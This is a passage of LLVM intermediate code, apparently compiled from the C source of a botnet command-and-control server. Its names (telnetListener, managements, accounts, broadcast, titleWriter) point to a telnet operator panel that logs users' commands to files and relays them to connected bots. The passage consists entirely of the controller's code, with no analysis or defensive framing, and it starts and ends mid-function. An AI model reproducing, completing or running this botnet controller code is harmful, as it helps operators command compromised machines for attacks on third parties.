  %545 = call i64 @strlen(i8* %544) #8
  %546 = call i64 @send(i32 %542, i8* %543, i64 %545, i32 16384)
  %547 = icmp eq i64 %546, -1
  br i1 %547, label %548, label %549

548:                                              ; preds = %539
  store i8* null, i8** %2, align 8
  br label %919

549:                                              ; preds = %539
  br label %550

550:                                              ; preds = %549, %435
  %551 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %552 = call i8* @strstr(i8* %551, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.81, i64 0, i64 0)) #8
  %553 = icmp ne i8* %552, null
  br i1 %553, label %554, label %576

554:                                              ; preds = %550
  %555 = call i32 @sleep(i32 2)
  %556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %557 = call i32 @rand() #9
  %558 = srem i32 %557, 8
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds [8 x i8*], [8 x i8*]* @ports, i64 0, i64 %559
  %561 = load i8*, i8** %560, align 8
  %562 = call i32 @rand() #9
  %563 = srem i32 %562, 8
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds [8 x i8*], [8 x i8*]* @ports, i64 0, i64 %564
  %566 = load i8*, i8** %565, align 8
  %567 = call i32 (i8*, i8*, ...) @sprintf(i8* %556, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.82, i64 0, i64 0), i8* %561, i8* %566) #9
  %568 = load i32, i32* %5, align 4
  %569 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %570 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %571 = call i64 @strlen(i8* %570) #8
  %572 = call i64 @send(i32 %568, i8* %569, i64 %571, i32 16384)
  %573 = icmp eq i64 %572, -1
  br i1 %573, label %574, label %575

574:                                              ; preds = %554
  store i8* null, i8** %2, align 8
  br label %919

575:                                              ; preds = %554
  br label %576

576:                                              ; preds = %575, %550
  %577 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %578 = call i32 @strncmp(i8* %577, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.83, i64 0, i64 0), i64 5) #8
  %579 = icmp eq i32 %578, 0
  br i1 %579, label %592, label %580

580:                                              ; preds = %576
  %581 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %582 = call i32 @strncmp(i8* %581, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.84, i64 0, i64 0), i64 5) #8
  %583 = icmp eq i32 %582, 0
  br i1 %583, label %592, label %584

584:                                              ; preds = %580
  %585 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %586 = call i32 @strncmp(i8* %585, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i64 0, i64 0), i64 3) #8
  %587 = icmp eq i32 %586, 0
  br i1 %587, label %592, label %588

588:                                              ; preds = %584
  %589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %590 = call i32 @strncmp(i8* %589, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0), i64 3) #8
  %591 = icmp eq i32 %590, 0
  br i1 %591, label %592, label %759

592:                                              ; preds = %588, %584, %580, %576
  %593 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %594 = call i32 @rand() #9
  %595 = srem i32 %594, 6
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %596
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 (i8*, i8*, ...) @sprintf(i8* %593, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.39, i64 0, i64 0), i8* %598) #9
  %600 = load i32, i32* %5, align 4
  %601 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %602 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %603 = call i64 @strlen(i8* %602) #8
  %604 = call i64 @send(i32 %600, i8* %601, i64 %603, i32 16384)
  %605 = icmp eq i64 %604, -1
  br i1 %605, label %606, label %607

606:                                              ; preds = %592
  br label %910

607:                                              ; preds = %592
  %608 = load i32, i32* %5, align 4
  %609 = call i64 @send(i32 %608, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i64 0, i64 0), i64 14, i32 16384)
  %610 = icmp eq i64 %609, -1
  br i1 %610, label %611, label %612

611:                                              ; preds = %607
  br label %910

612:                                              ; preds = %607
  %613 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %614 = call i32 (i8*, i8*, ...) @sprintf(i8* %613, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.87, i64 0, i64 0)) #9
  %615 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %616 = call i32 (i8*, i8*, ...) @sprintf(i8* %615, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.42, i64 0, i64 0)) #9
  %617 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %618 = call i32 (i8*, i8*, ...) @sprintf(i8* %617, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.43, i64 0, i64 0)) #9
  %619 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %620 = call i32 (i8*, i8*, ...) @sprintf(i8* %619, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.44, i64 0, i64 0)) #9
  %621 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %622 = call i32 (i8*, i8*, ...) @sprintf(i8* %621, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i64 0, i64 0)) #9
  %623 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %624 = call i32 (i8*, i8*, ...) @sprintf(i8* %623, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.46, i64 0, i64 0)) #9
  %625 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %626 = call i32 (i8*, i8*, ...) @sprintf(i8* %625, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.47, i64 0, i64 0)) #9
  %627 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %628 = call i32 (i8*, i8*, ...) @sprintf(i8* %627, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.48, i64 0, i64 0)) #9
  %629 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %630 = call i32 (i8*, i8*, ...) @sprintf(i8* %629, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.49, i64 0, i64 0)) #9
  %631 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %632 = call i32 (i8*, i8*, ...) @sprintf(i8* %631, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.87, i64 0, i64 0)) #9
  %633 = load i32, i32* %5, align 4
  %634 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %635 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %636 = call i64 @strlen(i8* %635) #8
  %637 = call i64 @send(i32 %633, i8* %634, i64 %636, i32 16384)
  %638 = icmp eq i64 %637, -1
  br i1 %638, label %639, label %640

639:                                              ; preds = %612
  br label %910

640:                                              ; preds = %612
  %641 = load i32, i32* %5, align 4
  %642 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %643 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %644 = call i64 @strlen(i8* %643) #8
  %645 = call i64 @send(i32 %641, i8* %642, i64 %644, i32 16384)
  %646 = icmp eq i64 %645, -1
  br i1 %646, label %647, label %648

647:                                              ; preds = %640
  br label %910

648:                                              ; preds = %640
  %649 = load i32, i32* %5, align 4
  %650 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %651 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %652 = call i64 @strlen(i8* %651) #8
  %653 = call i64 @send(i32 %649, i8* %650, i64 %652, i32 16384)
  %654 = icmp eq i64 %653, -1
  br i1 %654, label %655, label %656

655:                                              ; preds = %648
  br label %910

656:                                              ; preds = %648
  %657 = load i32, i32* %5, align 4
  %658 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %659 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %660 = call i64 @strlen(i8* %659) #8
  %661 = call i64 @send(i32 %657, i8* %658, i64 %660, i32 16384)
  %662 = icmp eq i64 %661, -1
  br i1 %662, label %663, label %664

663:                                              ; preds = %656
  br label %910

664:                                              ; preds = %656
  %665 = load i32, i32* %5, align 4
  %666 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %667 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %668 = call i64 @strlen(i8* %667) #8
  %669 = call i64 @send(i32 %665, i8* %666, i64 %668, i32 16384)
  %670 = icmp eq i64 %669, -1
  br i1 %670, label %671, label %672

671:                                              ; preds = %664
  br label %910

672:                                              ; preds = %664
  %673 = load i32, i32* %5, align 4
  %674 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %675 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %676 = call i64 @strlen(i8* %675) #8
  %677 = call i64 @send(i32 %673, i8* %674, i64 %676, i32 16384)
  %678 = icmp eq i64 %677, -1
  br i1 %678, label %679, label %680

679:                                              ; preds = %672
  br label %910

680:                                              ; preds = %672
  %681 = load i32, i32* %5, align 4
  %682 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %683 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %684 = call i64 @strlen(i8* %683) #8
  %685 = call i64 @send(i32 %681, i8* %682, i64 %684, i32 16384)
  %686 = icmp eq i64 %685, -1
  br i1 %686, label %687, label %688

687:                                              ; preds = %680
  br label %910

688:                                              ; preds = %680
  %689 = load i32, i32* %5, align 4
  %690 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %691 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %692 = call i64 @strlen(i8* %691) #8
  %693 = call i64 @send(i32 %689, i8* %690, i64 %692, i32 16384)
  %694 = icmp eq i64 %693, -1
  br i1 %694, label %695, label %696

695:                                              ; preds = %688
  br label %910

696:                                              ; preds = %688
  %697 = load i32, i32* %5, align 4
  %698 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %699 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %700 = call i64 @strlen(i8* %699) #8
  %701 = call i64 @send(i32 %697, i8* %698, i64 %700, i32 16384)
  %702 = icmp eq i64 %701, -1
  br i1 %702, label %703, label %704

703:                                              ; preds = %696
  br label %910

704:                                              ; preds = %696
  %705 = load i32, i32* %5, align 4
  %706 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %707 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %708 = call i64 @strlen(i8* %707) #8
  %709 = call i64 @send(i32 %705, i8* %706, i64 %708, i32 16384)
  %710 = icmp eq i64 %709, -1
  br i1 %710, label %711, label %712

711:                                              ; preds = %704
  br label %910

712:                                              ; preds = %704
  %713 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %714 = call i32 @rand() #9
  %715 = srem i32 %714, 6
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %716
  %718 = load i8*, i8** %717, align 8
  %719 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %720 = call i32 @rand() #9
  %721 = srem i32 %720, 6
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %722
  %724 = load i8*, i8** %723, align 8
  %725 = call i32 (i8*, i8*, ...) @sprintf(i8* %713, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.51, i64 0, i64 0), i8* %718, i8* %719, i8* %724) #9
  %726 = load i32, i32* %5, align 4
  %727 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %728 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %729 = call i64 @strlen(i8* %728) #8
  %730 = call i64 @send(i32 %726, i8* %727, i64 %729, i32 16384)
  %731 = icmp eq i64 %730, -1
  br i1 %731, label %732, label %733

732:                                              ; preds = %712
  br label %910

733:                                              ; preds = %712
  %734 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %29, i64 0, i64 0
  %735 = bitcast i8** %734 to i8*
  %736 = call i32 @rand() #9
  %737 = srem i32 %736, 5
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %738
  %740 = load i8*, i8** %739, align 8
  %741 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %742 = call i32 (i8*, i8*, ...) @sprintf(i8* %735, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.52, i64 0, i64 0), i8* %740, i8* %741) #9
  %743 = load i32, i32* %5, align 4
  %744 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %29, i64 0, i64 0
  %745 = bitcast i8** %744 to i8*
  %746 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %29, i64 0, i64 0
  %747 = bitcast i8** %746 to i8*
  %748 = call i64 @strlen(i8* %747) #8
  %749 = call i64 @send(i32 %743, i8* %745, i64 %748, i32 16384)
  %750 = icmp eq i64 %749, -1
  br i1 %750, label %751, label %752

751:                                              ; preds = %733
  br label %910

752:                                              ; preds = %733
  %753 = load i8*, i8** %3, align 8
  %754 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %753) #9
  %755 = load i32, i32* %5, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %756
  %758 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %757, i32 0, i32 0
  store i32 1, i32* %758, align 8
  br label %759

759:                                              ; preds = %752, %588
  %760 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %761 = call i32 @strncmp(i8* %760, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i64 0, i64 0), i64 4) #8
  %762 = icmp eq i32 %761, 0
  br i1 %762, label %771, label %763

763:                                              ; preds = %759
  %764 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %765 = call i32 @strncmp(i8* %764, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i64 0, i64 0), i64 4) #8
  %766 = icmp eq i32 %765, 0
  br i1 %766, label %771, label %767

767:                                              ; preds = %763
  %768 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %769 = call i32 @strncmp(i8* %768, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i64 0, i64 0), i64 6) #8
  %770 = icmp eq i32 %769, 0
  br i1 %770, label %771, label %772

771:                                              ; preds = %767, %763, %759
  br label %910

772:                                              ; preds = %767
  %773 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %774 = call i32 @strncmp(i8* %773, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i64 0, i64 0), i64 4) #8
  %775 = icmp eq i32 %774, 0
  br i1 %775, label %796, label %776

776:                                              ; preds = %772
  %777 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %778 = call i32 @strncmp(i8* %777, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i64 0, i64 0), i64 4) #8
  %779 = icmp eq i32 %778, 0
  br i1 %779, label %796, label %780

780:                                              ; preds = %776
  %781 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %782 = call i32 @strncmp(i8* %781, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.93, i64 0, i64 0), i64 4) #8
  %783 = icmp eq i32 %782, 0
  br i1 %783, label %796, label %784

784:                                              ; preds = %780
  %785 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %786 = call i32 @strncmp(i8* %785, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.94, i64 0, i64 0), i64 4) #8
  %787 = icmp eq i32 %786, 0
  br i1 %787, label %796, label %788

788:                                              ; preds = %784
  %789 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %790 = call i32 @strncmp(i8* %789, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i64 0, i64 0), i64 4) #8
  %791 = icmp eq i32 %790, 0
  br i1 %791, label %796, label %792

792:                                              ; preds = %788
  %793 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %794 = call i32 @strncmp(i8* %793, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i64 0, i64 0), i64 4) #8
  %795 = icmp eq i32 %794, 0
  br i1 %795, label %796, label %815

796:                                              ; preds = %792, %788, %784, %780, %776, %772
  %797 = load i32, i32* %6, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %798
  %800 = getelementptr inbounds %struct.account, %struct.account* %799, i32 0, i32 0
  %801 = getelementptr inbounds [20 x i8], [20 x i8]* %800, i64 0, i64 0
  %802 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %803 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.97, i64 0, i64 0), i8* %801, i8* %802)
  %804 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.98, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i64 0, i64 0))
  store %struct._IO_FILE* %804, %struct._IO_FILE** %30, align 8
  %805 = load %struct._IO_FILE*, %struct._IO_FILE** %30, align 8
  %806 = load i32, i32* %6, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %807
  %809 = getelementptr inbounds %struct.account, %struct.account* %808, i32 0, i32 0
  %810 = getelementptr inbounds [20 x i8], [20 x i8]* %809, i64 0, i64 0
  %811 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %812 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %805, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.100, i64 0, i64 0), i8* %810, i8* %811)
  %813 = load %struct._IO_FILE*, %struct._IO_FILE** %30, align 8
  %814 = call i32 @fclose(%struct._IO_FILE* %813)
  br label %910

815:                                              ; preds = %792
  %816 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %817 = call i8* @strstr(i8* %816, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i64 0, i64 0)) #8
  %818 = icmp ne i8* %817, null
  br i1 %818, label %819, label %838

819:                                              ; preds = %815
  %820 = load i32, i32* %6, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %821
  %823 = getelementptr inbounds %struct.account, %struct.account* %822, i32 0, i32 0
  %824 = getelementptr inbounds [20 x i8], [20 x i8]* %823, i64 0, i64 0
  %825 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %826 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.100, i64 0, i64 0), i8* %824, i8* %825)
  %827 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i64 0, i64 0))
  store %struct._IO_FILE* %827, %struct._IO_FILE** %31, align 8
  %828 = load %struct._IO_FILE*, %struct._IO_FILE** %31, align 8
  %829 = load i32, i32* %6, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %830
  %832 = getelementptr inbounds %struct.account, %struct.account* %831, i32 0, i32 0
  %833 = getelementptr inbounds [20 x i8], [20 x i8]* %832, i64 0, i64 0
  %834 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %835 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %828, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.100, i64 0, i64 0), i8* %833, i8* %834)
  %836 = load %struct._IO_FILE*, %struct._IO_FILE** %31, align 8
  %837 = call i32 @fclose(%struct._IO_FILE* %836)
  br label %910

838:                                              ; preds = %815
  %839 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %840 = call i8* @strstr(i8* %839, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.103, i64 0, i64 0)) #8
  %841 = icmp ne i8* %840, null
  br i1 %841, label %842, label %861

842:                                              ; preds = %838
  %843 = load i32, i32* %6, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %844
  %846 = getelementptr inbounds %struct.account, %struct.account* %845, i32 0, i32 0
  %847 = getelementptr inbounds [20 x i8], [20 x i8]* %846, i64 0, i64 0
  %848 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %849 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.104, i64 0, i64 0), i8* %847, i8* %848)
  %850 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i64 0, i64 0))
  store %struct._IO_FILE* %850, %struct._IO_FILE** %32, align 8
  %851 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %852 = load i32, i32* %6, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %853
  %855 = getelementptr inbounds %struct.account, %struct.account* %854, i32 0, i32 0
  %856 = getelementptr inbounds [20 x i8], [20 x i8]* %855, i64 0, i64 0
  %857 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %858 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %851, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.100, i64 0, i64 0), i8* %856, i8* %857)
  %859 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %860 = call i32 @fclose(%struct._IO_FILE* %859)
  br label %910

861:                                              ; preds = %838
  %862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %862)
  %863 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %33, i64 0, i64 0
  %864 = bitcast i8** %863 to i8*
  %865 = call i32 @rand() #9
  %866 = srem i32 %865, 5
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %867
  %869 = load i8*, i8** %868, align 8
  %870 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %871 = call i32 (i8*, i8*, ...) @sprintf(i8* %864, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.52, i64 0, i64 0), i8* %869, i8* %870) #9
  %872 = load i32, i32* %5, align 4
  %873 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %33, i64 0, i64 0
  %874 = bitcast i8** %873 to i8*
  %875 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %33, i64 0, i64 0
  %876 = bitcast i8** %875 to i8*
  %877 = call i64 @strlen(i8* %876) #8
  %878 = call i64 @send(i32 %872, i8* %874, i64 %877, i32 16384)
  %879 = icmp eq i64 %878, -1
  br i1 %879, label %880, label %881

880:                                              ; preds = %861
  br label %910

881:                                              ; preds = %861
  %882 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %883 = call i64 @strlen(i8* %882) #8
  %884 = icmp eq i64 %883, 0
  br i1 %884, label %885, label %886

885:                                              ; preds = %881
  br label %334, !llvm.loop !18

886:                                              ; preds = %881
  %887 = load i32, i32* %6, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %888
  %890 = getelementptr inbounds %struct.account, %struct.account* %889, i32 0, i32 0
  %891 = getelementptr inbounds [20 x i8], [20 x i8]* %890, i64 0, i64 0
  %892 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %893 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.106, i64 0, i64 0), i8* %891, i8* %892)
  %894 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.107, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i64 0, i64 0))
  store %struct._IO_FILE* %894, %struct._IO_FILE** %34, align 8
  %895 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %896 = load i32, i32* %6, align 4
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %897
  %899 = getelementptr inbounds %struct.account, %struct.account* %898, i32 0, i32 0
  %900 = getelementptr inbounds [20 x i8], [20 x i8]* %899, i64 0, i64 0
  %901 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %902 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %895, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.106, i64 0, i64 0), i8* %900, i8* %901)
  %903 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %904 = call i32 @fclose(%struct._IO_FILE* %903)
  %905 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %906 = load i32, i32* %5, align 4
  %907 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  call void @broadcast(i8* %905, i32 %906, i8* %907)
  %908 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %908, i8 0, i64 2048, i1 false)
  br label %334, !llvm.loop !18

909:                                              ; preds = %334
  br label %910

910:                                              ; preds = %909, %880, %842, %819, %796, %771, %751, %732, %711, %703, %695, %687, %679, %671, %663, %655, %647, %639, %611, %606, %326, %307, %286, %278, %270, %262, %254, %246, %238, %230, %222, %214, %186, %181, %163, %162, %156, %151, %132, %126, %95, %89
  %911 = load i32, i32* %5, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %912
  %914 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %913, i32 0, i32 0
  store i32 0, i32* %914, align 8
  %915 = load i32, i32* %5, align 4
  %916 = call i32 @close(i32 %915)
  %917 = load volatile i32, i32* @managesConnected, align 4
  %918 = add nsw i32 %917, -1
  store volatile i32 %918, i32* @managesConnected, align 4
  br label %919

919:                                              ; preds = %910, %574, %548, %538, %528, %518, %508, %498, %488, %478, %468, %458, %448, %425, %406, %383, %362
  %920 = load i8*, i8** %2, align 8
  ret i8* %920
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8*, i8*, i64) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.108, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
